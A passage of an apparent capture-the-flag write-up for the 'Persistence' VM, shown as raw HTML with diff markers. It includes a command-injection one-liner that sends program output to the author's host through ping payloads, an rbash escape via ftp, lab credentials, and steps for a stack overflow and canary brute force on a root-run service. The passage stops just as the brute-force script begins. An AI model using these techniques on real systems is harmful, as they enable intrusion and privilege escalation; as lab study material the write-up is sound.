+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# strings sysadmin-tool
+</span><span class='line'>/lib/ld-linux.so.2
+</span><span class='line'>__gmon_start__
+</span><span class='line'>libc.so.6
+</span><span class='line'>_IO_stdin_used
+</span><span class='line'>chroot
+</span><span class='line'>strncmp
+</span><span class='line'>puts
+</span><span class='line'>setreuid
+</span><span class='line'>mkdir
+</span><span class='line'>rmdir
+</span><span class='line'>chdir
+</span><span class='line'>system
+</span><span class='line'>__libc_start_main
+</span><span class='line'>GLIBC_2.0
+</span><span class='line'>PTRh
+</span><span class='line'><span class="o">[</span>^_<span class="o">]</span>
+</span><span class='line'>Usage: sysadmin-tool --activate-service
+</span><span class='line'>--activate-service
+</span><span class='line'>breakout
+</span><span class='line'>/bin/sed -i <span class="s1">&#39;s/^#//&#39;</span> /etc/sysconfig/iptables
+</span><span class='line'>/sbin/iptables-restore &lt; /etc/sysconfig/iptables
+</span><span class='line'>Service started...
+</span><span class='line'>Use avida:dollars to access.
+</span><span class='line'>/nginx/usr/share/nginx/html/breakout
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>From this alone we can deduce that when run, it may modify the firewall. It also looks like it contains some credentials, so I took note of those too. I then tried to run the command, followed by a nmap scan:</p>
+
+<figure class='code'><figcaption><span>Ping pattern `id` command</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="p">;</span>./sysadmin-tool --activate-service<span class="p">|</span> xxd -p -c 16 <span class="p">|</span> <span class="k">while </span><span class="nb">read </span>line<span class="p">;</span> <span class="k">do </span>ping -p <span class="nv">$line</span> -c 1 -q 192.168.56.102<span class="p">;</span> <span class="k">done</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><figcaption><span>second nmap of Persistence</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nmap 192.168.56.104 --reason -sV -p-
+</span><span class='line'>
+</span><span class='line'>Starting Nmap 6.46 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-09-18 09:46 SAST
+</span><span class='line'>Nmap scan report <span class="k">for </span>192.168.56.104
+</span><span class='line'>Host is up, received reset <span class="o">(</span>0.0017s latency<span class="o">)</span>.
+</span><span class='line'>Not shown: 65533 filtered ports
+</span><span class='line'>Reason: 65533 no-responses
+</span><span class='line'>PORT   STATE SERVICE REASON  VERSION
+</span><span class='line'>22/tcp open  ssh     syn-ack OpenSSH 5.3 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+</span><span class='line'>80/tcp open  http    syn-ack nginx 1.4.7
+</span><span class='line'>
+</span><span class='line'>Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+</span><span class='line'>Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned in 6637.05 seconds
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Yay! SSH.</p>
+
+<h2>shell and breakout as avida</h2>
+
+<p>Using the information that looked like credentials retrieved in the previous section, I proceeded to SSH into the server:</p>
+
+<figure class='code'><figcaption><span>avida rbash</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/Desktop/persistence# ssh avida@192.168.56.104
+</span><span class='line'>The authenticity of host <span class="s1">&#39;192.168.56.104 (192.168.56.104)&#39;</span> can<span class="s1">&#39;t be established.</span>
+</span><span class='line'><span class="s1">RSA key fingerprint is 37:22:da:ba:ef:05:1f:77:6a:30:6f:61:56:7b:47:54.</span>
+</span><span class='line'><span class="s1">Are you sure you want to continue connecting (yes/no)? yes</span>
+</span><span class='line'><span class="s1">Warning: Permanently added &#39;</span>192.168.56.104<span class="s1">&#39; (RSA) to the list of known hosts.</span>
+</span><span class='line'><span class="s1">avida@192.168.56.104&#39;</span>s password:    <span class="c"># dollars</span>
+</span><span class='line'>Last login: Thu Sep 18 05:57:30 2014
+</span><span class='line'>-rbash-4.1<span class="err">$</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Op success. Or is it? I immediately noticed the prompt as <code>rbash</code>, aka restricted bash. :( Having a look around, I was in fact very limited to what I can do. Most annoyingly, I was unable to run commands with a <code>/</code> in them.</p>
+
+<figure class='code'><figcaption><span>rbash restrictions</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>-rbash-4.1<span class="nv">$ </span>/bin/bash
+</span><span class='line'>-rbash: /bin/bash: restricted: cannot specify <span class="sb">`</span>/<span class="err">&#39;</span> in <span class="nb">command </span>names
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So the next logical step was to attempt &lsquo;breaking out&rsquo; of this shell so that I can have a better look around. I was able to cat say <code>/etc/passwd</code>, but that only gets you <em>that</em> far :P</p>
+
+<p>After quite some time and some research, it became apparent that the well known breakouts from rbash are not possible.  I was unable to edit my PATH, change files and re-login or use the classic <code>vi</code> <code>:shell</code> breakout. Eventually (and out of desperation), I focussed my attention to <code>ftp</code>. Opening <code>ftp</code>, and typing <code>help</code> at the prompt, I studied each available command carefully. In the list was a exclamation mark(!), which I typed and pressed enter:</p>
+
+<figure class='code'><figcaption><span>bash via ftp o_0</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>-rbash-4.1<span class="nv">$ </span>ftp
+</span><span class='line'>ftp&gt; !
+</span><span class='line'>+rbash-4.1<span class="nv">$ </span>/bin/bash
+</span><span class='line'>bash-4.1<span class="err">$</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I got dropped into another <code>rbash</code> shell, however this time with a +. So, I went for <code>/bin/bash</code> and&hellip; w00t? I exported a new PATH to my environment, and all of those annoying rbash restrictions were gone. Thank goodness!</p>
+
+<h2>the wopr game</h2>
+
+<p>During the enumeration done while still stuck with <code>rbash</code>, I noticed that the machine was listening for connections on tcp/3333 locally when inspecting the output of <code>netstat</code>. Opening a telnet session to this port presented you with a &lsquo;game&rsquo;:</p>
+
+<figure class='code'><figcaption><span>wopr</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.1<span class="nv">$ </span>telnet 127.0.0.1 3333
+</span><span class='line'>Trying 127.0.0.1...
+</span><span class='line'>Connected to 127.0.0.1.
+</span><span class='line'>Escape character is <span class="s1">&#39;^]&#39;</span>.
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> hello, my name is sploitable
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> would you like to play a game?
+</span><span class='line'>&gt; yes!
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> yeah, I don<span class="err">&#39;</span>t think so
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> bye!
+</span><span class='line'>Connection closed by foreign host.
+</span><span class='line'>bash-4.1<span class="err">$</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I asked really, really nicely, but no matter how polite I was, it would just not let me play!</p>
+
+<p>Further inspection showed that the game was possibly run as root from <code>/usr/local/bin/wopr</code></p>
+
+<figure class='code'><figcaption><span>wopr as root</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.1<span class="nv">$ </span>ps -ef <span class="p">|</span> grep wopr
+</span><span class='line'>root      1005     1  0 05:42 ?        00:00:00 /usr/local/bin/wopr
+</span><span class='line'>root      1577  1005  0 06:43 ?        00:00:00 <span class="o">[</span>wopr<span class="o">]</span> &lt;defunct&gt;
+</span><span class='line'>avida     1609  1501  0 06:47 pts/0    00:00:00 grep wopr
+</span><span class='line'>
+</span><span class='line'>bash-4.1<span class="nv">$ </span>ls -lah /usr/local/bin/wopr
+</span><span class='line'>-rwxr-xr-x. 1 root root 7.7K Apr 28 07:43 /usr/local/bin/wopr
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><code>wopr</code> was also readable to me which was great news! I decided to get a copy of the binary onto my local Kali Linux box, and take a closer look at the internals:</p>
+
+<figure class='code'><figcaption><span>wopr xxd xfer</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># first, hex encode the file</span>
+</span><span class='line'>bash-4.1<span class="nv">$ </span>xxd -p -c 36 /usr/local/bin/wopr
+</span><span class='line'>7f454c460101010000000000000000000200030001000000c08604083400000080110000
+</span><span class='line'>0000000034002000090028001e001b000600000034000000348004083480040820010000
+</span><span class='line'><span class="o">[</span>... snip ...<span class="o">]</span>
+</span><span class='line'>38362e6765745f70635f7468756e6b2e6278006d61696e005f696e697400
+</span><span class='line'>bash-4.1<span class="err">$</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># next, I copied the xxd output from the persistence terminal</span>
+</span><span class='line'><span class="c"># and pasted it into a file called wopr.xxd. Then reverted it</span>
+</span><span class='line'><span class="c"># and redirected the output to `wopr`</span>
+</span><span class='line'>root@kali:~# cat wopr.xxd <span class="p">|</span> xxd -r -p &gt; wopr
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The idea was to see if there may be a way to exploit this program so that I can execute some commands using it. It is running as root after all&hellip;</p>
+
+<h2>wopr, stack smashing</h2>
+
+<p>Poking around the binary, I mostly used <code>gdb</code> along with <a href="https://github.com/longld/peda">peda</a>.
+Checksec revealed that this binary was compiled with quite a few security features built in.</p>
+
+<figure class='code'><figcaption><span>wopr binary sec</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# gdb -q ./wopr
+</span><span class='line'>Reading symbols from persistence/wopr...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
+</span><span class='line'>gdb-peda<span class="nv">$ </span>checksec
+</span><span class='line'>CANARY    : ENABLED
+</span><span class='line'>FORTIFY   : disabled
+</span><span class='line'>NX        : ENABLED
+</span><span class='line'>PIE       : disabled
+</span><span class='line'>RELRO     : Partial
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Digesting the above output should bring us to a few conclusions. A stack canary is present, meaning if we corrupt memory, and dont have a correct canary, the binary may terminate itself as a protection mechanism once it detects the incorrect canary. Secondly, the binary is compiled to mark the stack as non executable. Any potential shellcode that we write here will not be executed. Lastly, the GOT relocation is set to read only, meaning function locations are resolved at the beginning of execution and the GOT is then marked as read only resulting in the inability to rewrite plt type lookups.</p>
+
+<p>With all of that in mind, I ran the binary with the <code>r</code> command, and made a new telnet session to it.</p>
+
+<figure class='code'><figcaption><span>wopr run</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>r
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> <span class="nb">bind complete</span>
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> waiting <span class="k">for </span>connections
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> logging queries to <span class="nv">$TMPLOG</span>
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> got a connection
+</span><span class='line'><span class="o">[</span>New process 26936<span class="o">]</span>
+</span><span class='line'><span class="o">[</span>Inferior 2 <span class="o">(</span>process 26936<span class="o">)</span> exited normally<span class="o">]</span>
+</span><span class='line'>Warning: not running or target is remote
+</span><span class='line'>gdb-peda<span class="err">$</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>When the new connection came in, a notice of a new process appears. Disassembling the main function gives us an indication that the process is doing a <code>fork()</code></p>
+
+<figure class='code'><figcaption><span>wopr fork()</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>disass main
+</span><span class='line'>Dump of assembler code <span class="k">for function </span>main:
+</span><span class='line'>    <span class="o">[</span>.. snip ..<span class="o">]</span>
+</span><span class='line'>   0x080489fd &lt;+543&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x8048cb2
+</span><span class='line'>   0x08048a04 &lt;+550&gt;:   call   0x804866c &lt;puts@plt&gt;
+</span><span class='line'>   0x08048a09 &lt;+555&gt;:   call   0x804867c &lt;fork@plt&gt; <span class="c"># &lt;--</span>
+</span><span class='line'>   0x08048a0e &lt;+560&gt;:   <span class="nb">test   </span>eax,eax
+</span><span class='line'>   0x08048a10 &lt;+562&gt;:   jne    0x8048b0e &lt;main+816&gt;
+</span><span class='line'>   0x08048a16 &lt;+568&gt;:   mov    DWORD PTR <span class="o">[</span>esp+0x8<span class="o">]</span>,0x21
+</span><span class='line'>   0x08048a1e &lt;+576&gt;:   mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,0x8048cc8
+</span><span class='line'>   0x08048a26 &lt;+584&gt;:   mov    eax,DWORD PTR <span class="o">[</span>ebp-0x22c<span class="o">]</span>
+</span><span class='line'>   0x08048a2c &lt;+590&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
+</span><span class='line'>   0x08048a2f &lt;+593&gt;:   call   0x804858c &lt;write@plt&gt;
+</span><span class='line'>    <span class="o">[</span>.. snip ..<span class="o">]</span>
+</span><span class='line'>End of assembler dump.
+</span><span class='line'>gdb-peda<span class="nv">$ </span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Why is the <code>fork()</code> so important!? We will see in a bit just hang on. :)</p>
+
+<p>So back to fuzzing wopr, I proceeded to send some arbtritary input via the telnet session. I noticed once I had sent more than 30 characters as input, wopr would freak out! This is a good freak out btw :D</p>
+
+<p>Sending 30 x A&rsquo;s results in:</p>
+
+<figure class='code'><figcaption><span>wopr stopper</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span><span class="o">[</span>+<span class="o">]</span> got a connection
+</span><span class='line'>*** stack smashing detected ***: wopr <span class="nv">terminated</span>
+</span><span class='line'><span class="o">=======</span> Backtrace: <span class="o">=========</span>
+</span><span class='line'>/lib/i386-linux-gnu/libc.so.6<span class="o">(</span>__fortify_fail+0x40<span class="o">)[</span>0xb7f5ebb0<span class="o">]</span>
+</span><span class='line'>/lib/i386-linux-gnu/libc.so.6<span class="o">(</span>+0xeab6a<span class="o">)[</span>0xb7f5eb6a<span class="o">]</span>
+</span><span class='line'>wopr<span class="o">[</span>0x80487dc<span class="o">]</span>
+</span><span class='line'>wopr<span class="o">[</span>0x8048ad6<span class="o">]</span>
+</span><span class='line'>/lib/i386-linux-gnu/libc.so.6<span class="o">(</span>__libc_start_main+0xe6<span class="o">)[</span>0xb7e8ae36<span class="o">]</span>
+</span><span class='line'>wopr<span class="o">[</span>0x80486e1<span class="o">]</span>
+</span><span class='line'><span class="o">=======</span> Memory map: <span class="o">========</span>
+</span><span class='line'>08048000-08049000 r-xp 00000000 08:01 1184792    wopr
+</span><span class='line'>08049000-0804a000 r--p 00000000 08:01 1184792    wopr
+</span><span class='line'>0804a000-0804b000 rw-p 00001000 08:01 1184792    wopr
+</span><span class='line'>0804b000-0806c000 rw-p 00000000 00:00 0          <span class="o">[</span>heap<span class="o">]</span>
+</span><span class='line'>b7e3b000-b7e57000 r-xp 00000000 08:01 1573598    /lib/i386-linux-gnu/libgcc_s.so.1
+</span><span class='line'>b7e57000-b7e58000 rw-p 0001b000 08:01 1573598    /lib/i386-linux-gnu/libgcc_s.so.1
+</span><span class='line'>b7e73000-b7e74000 rw-p 00000000 00:00 0
+</span><span class='line'>b7e74000-b7fbd000 r-xp 00000000 08:01 1580474    /lib/i386-linux-gnu/libc-2.13.so
+</span><span class='line'>b7fbd000-b7fbe000 ---p 00149000 08:01 1580474    /lib/i386-linux-gnu/libc-2.13.so
+</span><span class='line'>b7fbe000-b7fc0000 r--p 00149000 08:01 1580474    /lib/i386-linux-gnu/libc-2.13.so
+</span><span class='line'>b7fc0000-b7fc1000 rw-p 0014b000 08:01 1580474    /lib/i386-linux-gnu/libc-2.13.so
+</span><span class='line'>b7fc1000-b7fc4000 rw-p 00000000 00:00 0
+</span><span class='line'>b7fde000-b7fe1000 rw-p 00000000 00:00 0
+</span><span class='line'>b7fe1000-b7fe2000 r-xp 00000000 00:00 0          <span class="o">[</span>vdso<span class="o">]</span>
+</span><span class='line'>b7fe2000-b7ffe000 r-xp 00000000 08:01 1579852    /lib/i386-linux-gnu/ld-2.13.so
+</span><span class='line'>b7ffe000-b7fff000 r--p 0001b000 08:01 1579852    /lib/i386-linux-gnu/ld-2.13.so
+</span><span class='line'>b7fff000-b8000000 rw-p 0001c000 08:01 1579852    /lib/i386-linux-gnu/ld-2.13.so
+</span><span class='line'>bffdf000-c0000000 rw-p 00000000 00:00 0          <span class="o">[</span>stack<span class="o">]</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So it looks like we may have a <a href="http://en.wikipedia.org/wiki/Stack_buffer_overflow">buffer overflow</a> here. What is important though is the backtrace shows that the last fail was in <code>__fortify_fail</code>. <code>__fortify_fail</code> is normally just a error reporter, as was called because the stack cookie check failed. Remember the CANARY we detected earlier with the <code>checksec</code> output? With that knowledge, is almost safe to assume that byte 30 is where the stack canary starts. This means that if we want to corrupt more memory further up the stack (which is what we want actually), we need to find a way to know what the canary value is.</p>
+
+<p>But lets not stop there. I continued to place more A&rsquo;s into the input until at byte 39 I noticed 41 (hex for A) in the backtrace. By the time I had 42 A&rsquo;s, the backtrace had a full 4 bytes of 41.</p>
+
+<figure class='code'><figcaption><span>possible EIP</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">[</span>+<span class="o">]</span> got a connection
+</span><span class='line'>*** stack smashing detected ***: wopr <span class="nv">terminated</span>
+</span><span class='line'><span class="o">=======</span> Backtrace: <span class="o">=========</span>
+</span><span class='line'>/lib/i386-linux-gnu/libc.so.6<span class="o">(</span>__fortify_fail+0x40<span class="o">)[</span>0xb7f5ebb0<span class="o">]</span>
+</span><span class='line'>/lib/i386-linux-gnu/libc.so.6<span class="o">(</span>+0xeab6a<span class="o">)[</span>0xb7f5eb6a<span class="o">]</span>
+</span><span class='line'>wopr<span class="o">[</span>0x80487dc<span class="o">]</span>
+</span><span class='line'><span class="o">[</span>0x41414141<span class="o">]</span>        <span class="c">#&lt;-- EIP?</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Was this where EIP was?</p>
+
+<p>With the debugging we have done thus far, lets assume that the stack layout looks something like this:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='text'><span class='line'>- -&gt;         - -&gt;        [42 Bytes  in Total]        - -&gt;         - &gt;
+</span><span class='line'>
+</span><span class='line'>[        30 Bytes Data         ] [  Cookie  ] [  4 Bytes  ] [  EIP  ]
+</span><span class='line'>
+</span><span class='line'>- -&gt;         - -&gt;        [42 Bytes  in Total]        - -&gt;         - &gt;
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>wopr &ndash; stack canary bruteforce</h2>
+
+<p>This part of the challenge took me the second longest to nail. I have zero knowledge of stack cookies, let alone experience in bypassing them. So I had to pack out my best Google-fu abilities and learn all I can about bypassing these cookies.</p>
+
+<p>A lot was learnt here. The 3 primary resources that really helped me get the ball rolling into something workable was</p>
+
+<ul>
+<li><a href="http://phrack.org/issues/67/13.html">Phrack Issue 67</a></li>
+<li><a href="http://fluxius.handgrep.se/2011/10/20/the-art-of-elf-analysises-and-exploitations/">The Art Of ELF: Analysis and Exploitations</a></li>
+<li><a href="http://www.pwntester.com/blog/2013/12/31/fusion-level04-write-up/">Fusion level04 write-up</a> (SPOILER ALERTS for another CTF)</li>
+</ul>
+
+
+<p>Now, remember I mentioned <code>fork()</code> earlier on? From the Phrack article, we can read some interesting ideas about binaries that make use of <code>fork()</code> and how this affects stack cookies.</p>
+
+<p>From <code>man 2 fork</code>&rsquo;s description:</p>
+
+<figure class='code'><figcaption><span>fork man</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>DESCRIPTION
+</span><span class='line'>     Fork<span class="o">()</span> causes creation of a new process.  The new process <span class="o">(</span>child process<span class="o">)</span>
+</span><span class='line'>     is an exact copy of the calling process <span class="o">(</span>parent process<span class="o">)</span> except <span class="k">for </span>the
+</span><span class='line'>     following:
+</span><span class='line'>
+</span><span class='line'> <span class="o">[</span>.. snip ..<span class="o">]</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>What this means for us then is that every time we have a new <code>fork()</code> happen, the stack cookie will supposedly remain constant between forks as it comes from the parent. <em>”Soooooooo what?”</em> I hear you say! Well, that means we can attempt to try all of the possible ASCII characters as hex, 4 times (for 4 bytes), to try and brute force this value!</p>
+
+<p>The theory for this was great, but the practice was a different story. In order to perform a successful brute force, at the very minimum, I needed a reliable way to determine a correct and incorrect value. With my local copy of <code>wopr</code>, I can just watch the console output, however, I don&rsquo;t have that luxury on the Persistence VM!</p>
+
+<p>While thinking about this problem, I started to code a little script to start the juices flowing in getting this brute force right. The basic idea was to have a nested xrange(4) &ndash;> xrange(255) concat the values to a variable as they are determined. While tinkering with the script and the TCP socket code, I started to realize that there may actually be a way to remotely determine a failed and successful attempt!</p>
+
+<p>When a string of less than 30 A&rsquo;s is sent, the server will send a &ldquo;[+] bye!&rdquo; message before closing the socket. More than 30 A&rsquo;s, and the socket is killed before the bye</p>
+
+<figure class='code'><figcaption><span>Canary Brute Success Condition</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# telnet 127.0.0.1 3333
+</span><span class='line'>Trying 127.0.0.1...
+</span><span class='line'>Connected to 127.0.0.1.
+</span><span class='line'>Escape character is <span class="s1">&#39;^]&#39;</span>.
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> hello, my name is sploitable
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> would you like to play a game?
+</span><span class='line'>&gt; A
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> yeah, I don<span class="s1">&#39;t think so</span>
+</span><span class='line'><span class="s1">[+] bye!                           # &lt;-- We have a bye!</span>
+</span><span class='line'><span class="s1">Connection closed by foreign host.</span>
+</span><span class='line'>
+</span><span class='line'><span class="s1">root@kali:~# telnet 127.0.0.1 3333</span>
+</span><span class='line'><span class="s1">Trying 127.0.0.1...</span>
+</span><span class='line'><span class="s1">Connected to 127.0.0.1.</span>
+</span><span class='line'><span class="s1">Escape character is &#39;</span>^<span class="o">]</span><span class="s1">&#39;.</span>
+</span><span class='line'><span class="s1">[+] hello, my name is sploitable</span>
+</span><span class='line'><span class="s1">[+] would you like to play a game?</span>
+</span><span class='line'><span class="s1">&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>
+</span><span class='line'><span class="s1">[+] yeah, I don&#39;</span>t think so
+</span><span class='line'>Connection closed by foreign host. <span class="c"># &lt;-- No bye!</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This was perfect and exactly what was needed to complete the brute force script! All I had to do was check for the word <em>bye</em> in the last socket receive to know if we have succeeded or not. The resultant script was therefore:</p>
+
+<figure class='code'><figcaption><span>canary_brute.py</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
